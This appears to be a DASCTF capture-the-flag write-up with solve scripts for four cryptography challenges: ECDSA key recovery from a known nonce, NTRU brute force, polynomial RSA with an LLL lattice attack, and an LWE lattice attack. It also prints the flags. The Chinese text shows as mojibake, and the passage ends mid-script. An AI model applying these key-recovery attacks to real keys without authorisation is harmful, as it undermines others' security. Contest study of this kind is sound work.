<h2 id="CRYPTO"><a href="#CRYPTO" class="headerlink" title="CRYPTO"></a>CRYPTO</h2><h3 id="babysign"><a href="#babysign" class="headerlink" title="babysign"></a>babysign</h3><p>å·²çŸ¥<code>r,s,nonce,msg,order</code>ï¼Œ<code>k = nonce</code>ï¼Œ<code>s = k^&#123;-1&#125; * (msg + r*secret)\% order</code></p>
<p>å…¶ä¸­<code>orderâ€‹</code>ä¸ºå›ºå®šå€¼</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> ecdsa</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line">r = <span class="built_in">int</span>(<span class="string">&#x27;7b35712a50d463ac5acf7af1675b4b63ba0da23b6452023afddd58d4891ef6e5&#x27;</span>, <span class="number">16</span>)</span><br><span class="line">s = <span class="built_in">int</span>(<span class="string">&#x27;a452fc44cc36fa6964d1b4f47392ff0a91350cfd58f11a4645c084d56e387e5c&#x27;</span>, <span class="number">16</span>)</span><br><span class="line">nonce = <span class="number">57872441580840888721108499129165088876046881204464784483281653404168342111855</span></span><br><span class="line">msg = <span class="string">b&#x27;welcome to ecdsa&#x27;</span></span><br><span class="line">msg = <span class="built_in">int</span>(hashlib.sha256(msg).hexdigest(), <span class="number">16</span>)</span><br><span class="line">gen = ecdsa.NIST256p.generator</span><br><span class="line">order = gen.order()</span><br><span class="line">secret = (s * nonce - msg) * inverse(r, order) % order</span><br><span class="line"><span class="built_in">print</span>(<span class="string">b&#x27;DASCTF&#123;&#x27;</span> + long_to_bytes(secret) + <span class="string">b&#x27;&#125;&#x27;</span>)</span><br><span class="line"><span class="comment"># b&#x27;DASCTF&#123;11b7311d4f0137074a7256d3eb82f368&#125;&#x27;</span></span><br></pre></td></tr></table></figure>



<h3 id="easyNTRU"><a href="#easyNTRU" class="headerlink" title="easyNTRU"></a>easyNTRU</h3><p><code>n=10â€‹</code>å¾ˆå°ç›´æ¥çˆ†ç ´<code>m</code></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Hash <span class="keyword">import</span> SHA3_256</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line">c = <span class="string">b&#x27;\xb9W\x8c\x8b\x0cG\xde\x7fl\xf7\x03\xbb9m\x0c\xc4L\xfe\xe9Q\xad\xfd\xda!\x1a\xea@&#125;U\x9ay4\x8a\xe3y\xdf\xd5BV\xa7\x06\xf9\x08\x96=&quot;f\xc1\x1b\xd7\xdb\xc1j\x82F\x0b\x16\x06\xbcJMB\xc8\x80&#x27;</span></span><br><span class="line">R.&lt;x&gt; = ZZ[]</span><br><span class="line"><span class="keyword">import</span> itertools</span><br><span class="line">t = [<span class="number">1</span>, <span class="number">0</span>, -<span class="number">1</span>]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> itertools.product(t,repeat=<span class="number">10</span>):</span><br><span class="line">    m = <span class="built_in">list</span>(i)</span><br><span class="line">    m = R(m)</span><br><span class="line">    sha3 = SHA3_256.new()</span><br><span class="line">    sha3 = sha3.update(<span class="built_in">bytes</span>(<span class="built_in">str</span>(m).encode(<span class="string">&#x27;utf-8&#x27;</span>)))</span><br><span class="line">    key = sha3.digest()</span><br><span class="line">    cypher = AES.new(key, AES.MODE_ECB)</span><br><span class="line">    m = cypher.decrypt(c)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">b&#x27;DASCTF&#x27;</span> <span class="keyword">in</span> m:</span><br><span class="line">        <span class="built_in">print</span>(m)</span><br><span class="line"><span class="comment"># b&#x27;DASCTF&#123;b437acf4-aaf8-4f8f-ad84-5b1824f5af9c&#125;\x14\x14\x14\x14\x14\x14\x14\x14\x14\x14\x14\x14\x14\x14\x14\x14\x14\x14\x14\x14&#x27;</span></span><br></pre></td></tr></table></figure>



<h3 id="NTRURSA"><a href="#NTRURSA" class="headerlink" title="NTRURSA"></a>NTRURSA</h3><p>å…ˆå¤šé¡¹å¼RSAåˆ†è§£æ±‚<code>hint(h)â€‹</code>ï¼Œç„¶åâ€‹<code>NTRUâ€‹</code>æ±‚<code>g1</code>ï¼Œæœ€åçˆ†ç ´<code>rang</code>æ±‚<code>g</code>ï¼Œä¹‹åå°±æ˜¯æ™®é€šçš„<code>ras</code>ã€‚è„šæœ¬ç½‘ä¸Šéƒ½æœ‰ï¼Œæ‹¿æ¥ç”¨å°±è¡Œã€‚</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line">p= <span class="number">64621</span></span><br><span class="line">P = PolynomialRing(Zmod(p), name = <span class="string">&#x27;x&#x27;</span>)</span><br><span class="line">x = P.gen()</span><br><span class="line">e = <span class="number">0x10001</span></span><br><span class="line">n = <span class="number">25081</span>*x^<span class="number">175</span> + <span class="number">8744</span>*x^<span class="number">174</span> + <span class="number">9823</span>*x^<span class="number">173</span> + <span class="number">9037</span>*x^<span class="number">172</span> + <span class="number">6343</span>*x^<span class="number">171</span> + <span class="number">42205</span>*x^<span class="number">170</span> + <span class="number">28573</span>*x^<span class="number">169</span> + <span class="number">55714</span>*x^<span class="number">168</span> + <span class="number">17287</span>*x^<span class="number">167</span> + <span class="number">11229</span>*x^<span class="number">166</span> + <span class="number">42630</span>*x^<span class="number">165</span> + <span class="number">64363</span>*x^<span class="number">164</span> + <span class="number">50759</span>*x^<span class="number">163</span> + <span class="number">3368</span>*x^<span class="number">162</span> + <span class="number">20900</span>*x^<span class="number">161</span> + <span class="number">55947</span>*x^<span class="number">160</span> + <span class="number">7082</span>*x^<span class="number">159</span> + <span class="number">23171</span>*x^<span class="number">158</span> + <span class="number">48510</span>*x^<span class="number">157</span> + <span class="number">20013</span>*x^<span class="number">156</span> + <span class="number">16798</span>*x^<span class="number">155</span> + <span class="number">60438</span>*x^<span class="number">154</span> + <span class="number">58779</span>*x^<span class="number">153</span> + <span class="number">9289</span>*x^<span class="number">152</span> + <span class="number">10623</span>*x^<span class="number">151</span> + <span class="number">1085</span>*x^<span class="number">150</span> + <span class="number">23473</span>*x^<span class="number">149</span> + <span class="number">13795</span>*x^<span class="number">148</span> + <span class="number">2071</span>*x^<span class="number">147</span> + <span class="number">31515</span>*x^<span class="number">146</span> + <span class="number">42832</span>*x^<span class="number">145</span> + <span class="number">38152</span>*x^<span class="number">144</span> + <span class="number">37559</span>*x^<span class="number">143</span> + <span class="number">47653</span>*x^<span class="number">142</span> + <span class="number">37371</span>*x^<span class="number">141</span> + <span class="number">39128</span>*x^<span class="number">140</span> + <span class="number">48750</span>*x^<span class="number">139</span> + <span class="number">16638</span>*x^<span class="number">138</span> + <span class="number">60320</span>*x^<span class="number">137</span> + <span class="number">56224</span>*x^<span class="number">136</span> + <span class="number">41870</span>*x^<span class="number">135</span> + <span class="number">63961</span>*x^<span class="number">134</span> + <span class="number">47574</span>*x^<span class="number">133</span> + <span class="number">63954</span>*x^<span class="number">132</span> + <span class="number">9668</span>*x^<span class="number">131</span> + <span class="number">62360</span>*x^<span class="number">130</span> + <span class="number">15244</span>*x^<span class="number">129</span> + <span class="number">20599</span>*x^<span class="number">128</span> + <span class="number">28704</span>*x^<span class="number">127</span> + <span class="number">26857</span>*x^<span class="number">126</span> + <span class="number">34885</span>*x^<span class="number">125</span> + <span class="number">33107</span>*x^<span class="number">124</span> + <span class="number">17693</span>*x^<span class="number">123</span> + <span class="number">52753</span>*x^<span class="number">122</span> + <span class="number">60744</span>*x^<span class="number">121</span> + <span class="number">21305</span>*x^<span class="number">120</span> + <span class="number">63785</span>*x^<span class="number">119</span> + <span class="number">54400</span>*x^<span class="number">118</span> + <span class="number">17812</span>*x^<span class="number">117</span> + <span class="number">64549</span>*x^<span class="number">116</span> + <span class="number">20035</span>*x^<span class="number">115</span> + <span class="number">37567</span>*x^<span class="number">114</span> + <span class="number">38607</span>*x^<span class="number">113</span> + <span class="number">32783</span>*x^<span class="number">112</span> + <span class="number">24385</span>*x^<span class="number">111</span> + <span class="number">5387</span>*x^<span class="number">110</span> + <span class="number">5134</span>*x^<span class="number">109</span> + <span class="number">45893</span>*x^<span class="number">108</span> + <span class="number">58307</span>*x^<span class="number">107</span> + <span class="number">33821</span>*x^<span class="number">106</span> + <span class="number">54902</span>*x^<span class="number">105</span> + <span class="number">14236</span>*x^<span class="number">104</span> + <span class="number">58044</span>*x^<span class="number">103</span> + <span class="number">41257</span>*x^<span class="number">102</span> + <span class="number">46881</span>*x^<span class="number">101</span> + <span class="number">42834</span>*x^<span class="number">100</span> + <span class="number">1693</span>*x^<span class="number">99</span> + <span class="number">46058</span>*x^<span class="number">98</span> + <span class="number">15636</span>*x^<span class="number">97</span> + <span class="number">27111</span>*x^<span class="number">96</span> + <span class="number">3158</span>*x^<span class="number">95</span> + <span class="number">41012</span>*x^<span class="number">94</span> + <span class="number">26028</span>*x^<span class="number">93</span> + <span class="number">3576</span>*x^<span class="number">92</span> + <span class="number">37958</span>*x^<span class="number">91</span> + <span class="number">33273</span>*x^<span class="number">90</span> + <span class="number">60228</span>*x^<span class="number">89</span> + <span class="number">41229</span>*x^<span class="number">88</span> + <span class="number">11232</span>*x^<span class="number">87</span> + <span class="number">12635</span>*x^<span class="number">86</span> + <span class="number">17942</span>*x^<span class="number">85</span> + <span class="number">4</span>*x^<span class="number">84</span> + <span class="number">25397</span>*x^<span class="number">83</span> + <span class="number">63526</span>*x^<span class="number">82</span> + <span class="number">54872</span>*x^<span class="number">81</span> + <span class="number">40318</span>*x^<span class="number">80</span> + <span class="number">37498</span>*x^<span class="number">79</span> + <span class="number">52182</span>*x^<span class="number">78</span> + <span class="number">48817</span>*x^<span class="number">77</span> + <span class="number">10763</span>*x^<span class="number">76</span> + <span class="number">46542</span>*x^<span class="number">75</span> + <span class="number">36060</span>*x^<span class="number">74</span> + <span class="number">49972</span>*x^<span class="number">73</span> + <span class="number">63603</span>*x^<span class="number">72</span> + <span class="number">46506</span>*x^<span class="number">71</span> + <span class="number">44788</span>*x^<span class="number">70</span> + <span class="number">44905</span>*x^<span class="number">69</span> + <span class="number">46112</span>*x^<span class="number">68</span> + <span class="number">5297</span>*x^<span class="number">67</span> + <span class="number">26440</span>*x^<span class="number">66</span> + <span class="number">28470</span>*x^<span class="number">65</span> + <span class="number">15525</span>*x^<span class="number">64</span> + <span class="number">11566</span>*x^<span class="number">63</span> + <span class="number">15781</span>*x^<span class="number">62</span> + <span class="number">36098</span>*x^<span class="number">61</span> + <span class="number">44402</span>*x^<span class="number">60</span> + <span class="number">55331</span>*x^<span class="number">59</span> + <span class="number">61583</span>*x^<span class="number">58</span> + <span class="number">16406</span>*x^<span class="number">57</span> + <span class="number">59089</span>*x^<span class="number">56</span> + <span class="number">53161</span>*x^<span class="number">55</span> + <span class="number">43695</span>*x^<span class="number">54</span> + <span class="number">49580</span>*x^<span class="number">53</span> + <span class="number">62685</span>*x^<span class="number">52</span> + <span class="number">31447</span>*x^<span class="number">51</span> + <span class="number">26755</span>*x^<span class="number">50</span> + <span class="number">14810</span>*x^<span class="number">49</span> + <span class="number">3281</span>*x^<span class="number">48</span> + <span class="number">27371</span>*x^<span class="number">47</span> + <span class="number">53392</span>*x^<span class="number">46</span> + <span class="number">2648</span>*x^<span class="number">45</span> + <span class="number">10095</span>*x^<span class="number">44</span> + <span class="number">25977</span>*x^<span class="number">43</span> + <span class="number">22912</span>*x^<span class="number">42</span> + <span class="number">41278</span>*x^<span class="number">41</span> + <span class="number">33236</span>*x^<span class="number">40</span> + <span class="number">57792</span>*x^<span class="number">39</span> + <span class="number">7169</span>*x^<span class="number">38</span> + <span class="number">29250</span>*x^<span class="number">37</span> + <span class="number">16906</span>*x^<span class="number">36</span> + <span class="number">4436</span>*x^<span class="number">35</span> + <span class="number">2729</span>*x^<span class="number">34</span> + <span class="number">29736</span>*x^<span class="number">33</span> + <span class="number">19383</span>*x^<span class="number">32</span> + <span class="number">11921</span>*x^<span class="number">31</span> + <span class="number">26075</span>*x^<span class="number">30</span> + <span class="number">54616</span>*x^<span class="number">29</span> + <span class="number">739</span>*x^<span class="number">28</span> + <span class="number">38509</span>*x^<span class="number">27</span> + <span class="number">19118</span>*x^<span class="number">26</span> + <span class="number">20062</span>*x^<span class="number">25</span> + <span class="number">21280</span>*x^<span class="number">24</span> + <span class="number">12594</span>*x^<span class="number">23</span> + <span class="number">14974</span>*x^<span class="number">22</span> + <span class="number">27795</span>*x^<span class="number">21</span> + <span class="number">54107</span>*x^<span class="number">20</span> + <span class="number">1890</span>*x^<span class="number">19</span> + <span class="number">13410</span>*x^<span class="number">18</span> + <span class="number">5381</span>*x^<span class="number">17</span> + <span class="number">19500</span>*x^<span class="number">16</span> + <span class="number">47481</span>*x^<span class="number">15</span> + <span class="number">58488</span>*x^<span class="number">14</span> + <span class="number">26433</span>*x^<span class="number">13</span> + <span class="number">37803</span>*x^<span class="number">12</span> + <span class="number">60232</span>*x^<span class="number">11</span> + <span class="number">34772</span>*x^<span class="number">10</span> + <span class="number">1505</span>*x^<span class="number">9</span> + <span class="number">63760</span>*x^<span class="number">8</span> + <span class="number">20890</span>*x^<span class="number">7</span> + <span class="number">41533</span>*x^<span class="number">6</span> + <span class="number">16130</span>*x^<span class="number">5</span> + <span class="number">29769</span>*x^<span class="number">4</span> + <span class="number">49142</span>*x^<span class="number">3</span> + <span class="number">64184</span>*x^<span class="number">2</span> + <span class="number">55443</span>*x + <span class="number">45925</span></span><br><span class="line">c = <span class="number">19921</span>*x^<span class="number">174</span> + <span class="number">49192</span>*x^<span class="number">173</span> + <span class="number">18894</span>*x^<span class="number">172</span> + <span class="number">61121</span>*x^<span class="number">171</span> + <span class="number">50271</span>*x^<span class="number">170</span> + <span class="number">11860</span>*x^<span class="number">169</span> + <span class="number">53128</span>*x^<span class="number">168</span> + <span class="number">38658</span>*x^<span class="number">167</span> + <span class="number">14191</span>*x^<span class="number">166</span> + <span class="number">9671</span>*x^<span class="number">165</span> + <span class="number">40879</span>*x^<span class="number">164</span> + <span class="number">15187</span>*x^<span class="number">163</span> + <span class="number">33523</span>*x^<span class="number">162</span> + <span class="number">62270</span>*x^<span class="number">161</span> + <span class="number">64211</span>*x^<span class="number">160</span> + <span class="number">54518</span>*x^<span class="number">159</span> + <span class="number">50446</span>*x^<span class="number">158</span> + <span class="number">2597</span>*x^<span class="number">157</span> + <span class="number">32216</span>*x^<span class="number">156</span> + <span class="number">10500</span>*x^<span class="number">155</span> + <span class="number">63276</span>*x^<span class="number">154</span> + <span class="number">27916</span>*x^<span class="number">153</span> + <span class="number">55316</span>*x^<span class="number">152</span> + <span class="number">30898</span>*x^<span class="number">151</span> + <span class="number">43706</span>*x^<span class="number">150</span> + <span class="number">5734</span>*x^<span class="number">149</span> + <span class="number">35616</span>*x^<span class="number">148</span> + <span class="number">14288</span>*x^<span class="number">147</span> + <span class="number">18282</span>*x^<span class="number">146</span> + <span class="number">22788</span>*x^<span class="number">145</span> + <span class="number">48188</span>*x^<span class="number">144</span> + <span class="number">34176</span>*x^<span class="number">143</span> + <span class="number">55952</span>*x^<span class="number">142</span> + <span class="number">9578</span>*x^<span class="number">141</span> + <span class="number">9177</span>*x^<span class="number">140</span> + <span class="number">22083</span>*x^<span class="number">139</span> + <span class="number">14586</span>*x^<span class="number">138</span> + <span class="number">9748</span>*x^<span class="number">137</span> + <span class="number">21118</span>*x^<span class="number">136</span> + <span class="number">155</span>*x^<span class="number">135</span> + <span class="number">64224</span>*x^<span class="number">134</span> + <span class="number">18193</span>*x^<span class="number">133</span> + <span class="number">33732</span>*x^<span class="number">132</span> + <span class="number">38135</span>*x^<span class="number">131</span> + <span class="number">51992</span>*x^<span class="number">130</span> + <span class="number">8203</span>*x^<span class="number">129</span> + <span class="number">8538</span>*x^<span class="number">128</span> + <span class="number">55203</span>*x^<span class="number">127</span> + <span class="number">5003</span>*x^<span class="number">126</span> + <span class="number">2009</span>*x^<span class="number">125</span> + <span class="number">45023</span>*x^<span class="number">124</span> + <span class="number">12311</span>*x^<span class="number">123</span> + <span class="number">21428</span>*x^<span class="number">122</span> + <span class="number">24110</span>*x^<span class="number">121</span> + <span class="number">43537</span>*x^<span class="number">120</span> + <span class="number">21885</span>*x^<span class="number">119</span> + <span class="number">50212</span>*x^<span class="number">118</span> + <span class="number">40445</span>*x^<span class="number">117</span> + <span class="number">17768</span>*x^<span class="number">116</span> + <span class="number">46616</span>*x^<span class="number">115</span> + <span class="number">4771</span>*x^<span class="number">114</span> + <span class="number">20903</span>*x^<span class="number">113</span> + <span class="number">47764</span>*x^<span class="number">112</span> + <span class="number">13056</span>*x^<span class="number">111</span> + <span class="number">50837</span>*x^<span class="number">110</span> + <span class="number">22313</span>*x^<span class="number">109</span> + <span class="number">39698</span>*x^<span class="number">108</span> + <span class="number">60377</span>*x^<span class="number">107</span> + <span class="number">59357</span>*x^<span class="number">106</span> + <span class="number">24051</span>*x^<span class="number">105</span> + <span class="number">5888</span>*x^<span class="number">104</span> + <span class="number">29414</span>*x^<span class="number">103</span> + <span class="number">31726</span>*x^<span class="number">102</span> + <span class="number">4906</span>*x^<span class="number">101</span> + <span class="number">23968</span>*x^<span class="number">100</span> + <span class="number">52360</span>*x^<span class="number">99</span> + <span class="number">58063</span>*x^<span class="number">98</span> + <span class="number">706</span>*x^<span class="number">97</span> + <span class="number">31420</span>*x^<span class="number">96</span> + <span class="number">62468</span>*x^<span class="number">95</span> + <span class="number">18557</span>*x^<span class="number">94</span> + <span class="number">1498</span>*x^<span class="number">93</span> + <span class="number">17590</span>*x^<span class="number">92</span> + <span class="number">62990</span>*x^<span class="number">91</span> + <span class="number">27200</span>*x^<span class="number">90</span> + <span class="number">7052</span>*x^<span class="number">89</span> + <span class="number">39117</span>*x^<span class="number">88</span> + <span class="number">46944</span>*x^<span class="number">87</span> + <span class="number">45535</span>*x^<span class="number">86</span> + <span class="number">28092</span>*x^<span class="number">85</span> + <span class="number">1981</span>*x^<span class="number">84</span> + <span class="number">4377</span>*x^<span class="number">83</span> + <span class="number">34419</span>*x^<span class="number">82</span> + <span class="number">33754</span>*x^<span class="number">81</span> + <span class="number">2640</span>*x^<span class="number">80</span> + <span class="number">44427</span>*x^<span class="number">79</span> + <span class="number">32179</span>*x^<span class="number">78</span> + <span class="number">57721</span>*x^<span class="number">77</span> + <span class="number">9444</span>*x^<span class="number">76</span> + <span class="number">49374</span>*x^<span class="number">75</span> + <span class="number">21288</span>*x^<span class="number">74</span> + <span class="number">44098</span>*x^<span class="number">73</span> + <span class="number">57744</span>*x^<span class="number">72</span> + <span class="number">63457</span>*x^<span class="number">71</span> + <span class="number">43300</span>*x^<span class="number">70</span> + <span class="number">1508</span>*x^<span class="number">69</span> + <span class="number">13775</span>*x^<span class="number">68</span> + <span class="number">23197</span>*x^<span class="number">67</span> + <span class="number">43070</span>*x^<span class="number">66</span> + <span class="number">20751</span>*x^<span class="number">65</span> + <span class="number">47479</span>*x^<span class="number">64</span> + <span class="number">18496</span>*x^<span class="number">63</span> + <span class="number">53392</span>*x^<span class="number">62</span> + <span class="number">10387</span>*x^<span class="number">61</span> + <span class="number">2317</span>*x^<span class="number">60</span> + <span class="number">57492</span>*x^<span class="number">59</span> + <span class="number">25441</span>*x^<span class="number">58</span> + <span class="number">52532</span>*x^<span class="number">57</span> + <span class="number">27150</span>*x^<span class="number">56</span> + <span class="number">33788</span>*x^<span class="number">55</span> + <span class="number">43371</span>*x^<span class="number">54</span> + <span class="number">30972</span>*x^<span class="number">53</span> + <span class="number">39583</span>*x^<span class="number">52</span> + <span class="number">36407</span>*x^<span class="number">51</span> + <span class="number">35564</span>*x^<span class="number">50</span> + <span class="number">44564</span>*x^<span class="number">49</span> + <span class="number">1505</span>*x^<span class="number">48</span> + <span class="number">47519</span>*x^<span class="number">47</span> + <span class="number">38695</span>*x^<span class="number">46</span> + <span class="number">43107</span>*x^<span class="number">45</span> + <span class="number">1676</span>*x^<span class="number">44</span> + <span class="number">42057</span>*x^<span class="number">43</span> + <span class="number">49879</span>*x^<span class="number">42</span> + <span class="number">29083</span>*x^<span class="number">41</span> + <span class="number">42241</span>*x^<span class="number">40</span> + <span class="number">8853</span>*x^<span class="number">39</span> + <span class="number">33546</span>*x^<span class="number">38</span> + <span class="number">48954</span>*x^<span class="number">37</span> + <span class="number">30352</span>*x^<span class="number">36</span> + <span class="number">62020</span>*x^<span class="number">35</span> + <span class="number">39864</span>*x^<span class="number">34</span> + <span class="number">9519</span>*x^<span class="number">33</span> + <span class="number">24828</span>*x^<span class="number">32</span> + <span class="number">34696</span>*x^<span class="number">31</span> + <span class="number">2387</span>*x^<span class="number">30</span> + <span class="number">27413</span>*x^<span class="number">29</span> + <span class="number">55829</span>*x^<span class="number">28</span> + <span class="number">40217</span>*x^<span class="number">27</span> + <span class="number">30205</span>*x^<span class="number">26</span> + <span class="number">42328</span>*x^<span class="number">25</span> + <span class="number">6210</span>*x^<span class="number">24</span> + <span class="number">52442</span>*x^<span class="number">23</span> + <span class="number">58495</span>*x^<span class="number">22</span> + <span class="number">2014</span>*x^<span class="number">21</span> + <span class="number">26452</span>*x^<span class="number">20</span> + <span class="number">33547</span>*x^<span class="number">19</span> + <span class="number">19840</span>*x^<span class="number">18</span> + <span class="number">5995</span>*x^<span class="number">17</span> + <span class="number">16850</span>*x^<span class="number">16</span> + <span class="number">37855</span>*x^<span class="number">15</span> + <span class="number">7221</span>*x^<span class="number">14</span> + <span class="number">32200</span>*x^<span class="number">13</span> + <span class="number">8121</span>*x^<span class="number">12</span> + <span class="number">23767</span>*x^<span class="number">11</span> + <span class="number">46563</span>*x^<span class="number">10</span> + <span class="number">51673</span>*x^<span class="number">9</span> + <span class="number">19372</span>*x^<span class="number">8</span> + <span class="number">4157</span>*x^<span class="number">7</span> + <span class="number">48421</span>*x^<span class="number">6</span> + <span class="number">41096</span>*x^<span class="number">5</span> + <span class="number">45735</span>*x^<span class="number">4</span> + <span class="number">53022</span>*x^<span class="number">3</span> + <span class="number">35475</span>*x^<span class="number">2</span> + <span class="number">47521</span>*x + <span class="number">27544</span></span><br><span class="line"><span class="comment">#åˆ†è§£N</span></span><br><span class="line">q1, q2 = n.factor()</span><br><span class="line">q1, q2 = q1[<span class="number">0</span>], q2[<span class="number">0</span>]</span><br><span class="line"><span class="comment">#æ±‚Ï†ï¼Œæ³¨æ„æ±‚æ³•ï¼Œ</span></span><br><span class="line">phi = (p**q1.degree() - <span class="number">1</span>) * (p**q2.degree() - <span class="number">1</span>)</span><br><span class="line"><span class="keyword">assert</span> gcd(e, phi) == <span class="number">1</span></span><br><span class="line">d = inverse_mod(e, phi)</span><br><span class="line">m = <span class="built_in">pow</span>(c,d,n)</span><br><span class="line">h = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">77</span>):</span><br><span class="line">    h+=<span class="built_in">str</span>(m[i])</span><br><span class="line">h = <span class="built_in">int</span>(h)</span><br><span class="line">p = <span class="number">106472061241112922861460644342336453303928202010237284715354717630502168520267</span></span><br><span class="line">c = <span class="number">20920247107738496784071050239422540936224577122721266141057957551603705972966457203177812404896852110975768315464852962210648535130235298413611598658659777108920014929632531307409885868941842921815735008981335582297975794108016151210394446009890312043259167806981442425505200141283138318269058818777636637375101005540308736021976559495266332357714</span></span><br><span class="line">v1 = vector(ZZ, [<span class="number">1</span>, h])</span><br><span class="line">v2 = vector(ZZ, [<span class="number">0</span>, p])</span><br><span class="line">m = matrix([v1,v2]);</span><br><span class="line">f, g1 = m.LLL()[<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line">g1 = <span class="number">228679177303871981036829786447405151037</span></span><br><span class="line">n = <span class="number">31398174203566229210665534094126601315683074641013205440476552584312112883638278390105806127975406224783128340041129316782549009811196493319665336016690985557862367551545487842904828051293613836275987595871004601968935866634955528775536847402581734910742403788941725304146192149165731194199024154454952157531068881114411265538547462017207361362857</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>^<span class="number">20</span>):</span><br><span class="line">    q = g1 ^^ i</span><br><span class="line">    <span class="keyword">if</span> n % q == <span class="number">0</span>:</span><br><span class="line">        p = n // q</span><br><span class="line">        phi = (p-<span class="number">1</span>) * (q-<span class="number">1</span>)</span><br><span class="line">        d = inverse(<span class="number">0x10001</span>,phi)</span><br><span class="line">        <span class="built_in">print</span>(long_to_bytes(<span class="built_in">int</span>(<span class="built_in">pow</span>(c,d,n))))</span><br><span class="line"><span class="comment"># b&#x27;DASCTF&#123;P01yn0m141RS4_W17h_NTRU&#125;&#x27;</span></span><br></pre></td></tr></table></figure>

<h3 id="LWE-å¤ç°"><a href="#LWE-å¤ç°" class="headerlink" title="LWE?(å¤ç°)"></a>LWE?(å¤ç°)</h3><p>LWE? GGH?ç”¨Babaiçš„ç®—æ³•å¥½åƒé€šåƒï¼Ÿï¼ˆ198Ã—200çš„çŸ©é˜µLLLè¦ä¸€ç‚¹ç‚¹çš„æ—¶é—´ï¼‰<br><code>b = x*A+b*Y+z*C+e</code>å¯ä»¥çœ‹æˆ<code>b = secret*D+e</code>ï¼Œå³å°†<code>x,y,z;A,B,C</code>æ‹¼èµ·æ¥ï¼Œé…±ç´«çœ‹èµ·æ¥å°±åƒGGHçš„å½¢å¼äº†;ä½†è½¬åŒ–ä¸€ä¸‹è¡Œå’Œåˆ—åˆèƒ½æœ‰<code>b&#39; = D&#39;*secret+e</code>ï¼Œé…±ç´«çœ‹æ¥åˆå¥½åƒæ˜¯LWEäº†ã€‚</p>
<p>é“ç†æˆ‘ä¸æ‡‚ï¼Œè„šæœ¬æˆ‘ä¼šç”¨</p>
<p>åæ­£Babaiç®—æ³•å’ŒNguyenâ€™s Attackç®—æ³•éƒ½å¯è§£</p>
<p><img src="https://img-blog.csdnimg.cn/b610fe4e07bb40b0ac67c01d6889b46e.png" alt="img"></p>
<p>DASCTF{dcf41556-c194-4c66-9092-059e0bf8b84e}</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># è·‘ä¸ªåŠå°æ—¶ï¼Ÿ</span></span><br><span class="line"><span class="keyword">from</span> sage.modules.free_module_integer <span class="keyword">import</span> IntegerLattice</span><br><span class="line"></span><br><span class="line">m = <span class="number">66</span></span><br><span class="line">n = <span class="number">200</span></span><br><span class="line">p = <span class="number">3</span></span><br><span class="line">q = <span class="number">2</span> ^ <span class="number">20</span></span><br><span class="line">f = <span class="built_in">open</span>(<span class="string">&#x27;out&#x27;</span>, <span class="string">&#x27;r&#x27;</span>)</span><br><span class="line">A = []</span><br><span class="line">B = []</span><br><span class="line">C = []</span><br><span class="line">f.readline()</span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(m):</span><br><span class="line">    x = f.readline().replace(<span class="string">&#x27;  &#x27;</span>, <span class="string">&#x27; &#x27;</span>).replace(<span class="string">&#x27;  &#x27;</span>, <span class="string">&#x27; &#x27;</span>).replace(<span class="string">&#x27;  &#x27;</span>, <span class="string">&#x27; &#x27;</span>).replace(<span class="string">&#x27;\n&#x27;</span>, <span class="string">&#x27;&#x27;</span>).replace(<span class="string">&#x27; &#x27;</span>, <span class="string">&#x27;,&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> x[<span class="number">1</span>] == <span class="string">&#x27;,&#x27;</span>:</span><br><span class="line">        x = x[<span class="number">0</span>] + x[<span class="number">2</span>:]</span><br><span class="line">    x = <span class="built_in">eval</span>(x)</span><br><span class="line">    A.append(x)</span><br><span class="line">f.readline()</span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(m):</span><br><span class="line">    x = f.readline().replace(<span class="string">&#x27;  &#x27;</span>, <span class="string">&#x27; &#x27;</span>).replace(<span class="string">&#x27;  &#x27;</span>, <span class="string">&#x27; &#x27;</span>).replace(<span class="string">&#x27;  &#x27;</span>, <span class="string">&#x27; &#x27;</span>).replace(<span class="string">&#x27;\n&#x27;</span>, <span class="string">&#x27;&#x27;</span>).replace(<span class="string">&#x27; &#x27;</span>, <span class="string">&#x27;,&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> x[<span class="number">1</span>] == <span class="string">&#x27;,&#x27;</span>:</span><br><span class="line">        x = x[<span class="number">0</span>] + x[<span class="number">2</span>:]</span><br><span class="line">    x = <span class="built_in">eval</span>(x)</span><br><span class="line">    B.append(x)</span><br><span class="line">f.readline()</span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(m):</span><br><span class="line">    x = f.readline().replace(<span class="string">&#x27;  &#x27;</span>, <span class="string">&#x27; &#x27;</span>).replace(<span class="string">&#x27;  &#x27;</span>, <span class="string">&#x27; &#x27;</span>).replace(<span class="string">&#x27;  &#x27;</span>, <span class="string">&#x27; &#x27;</span>).replace(<span class="string">&#x27;\n&#x27;</span>, <span class="string">&#x27;&#x27;</span>).replace(<span class="string">&#x27; &#x27;</span>, <span class="string">&#x27;,&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> x[<span class="number">1</span>] == <span class="string">&#x27;,&#x27;</span>:</span><br><span class="line">        x = x[<span class="number">0</span>] + x[<span class="number">2</span>:]</span><br><span class="line">    x = <span class="built_in">eval</span>(x)</span><br><span class="line">    C.append(x)</span><br><span class="line">f.close()</span><br><span class="line">b = (</span><br><span class="line">-<span class="number">19786291</span>, -<span class="number">713104590</span>, <span class="number">79700973</span>, <span class="number">23261288</span>, <span class="number">203038164</span>, <span class="number">430352288</span>, 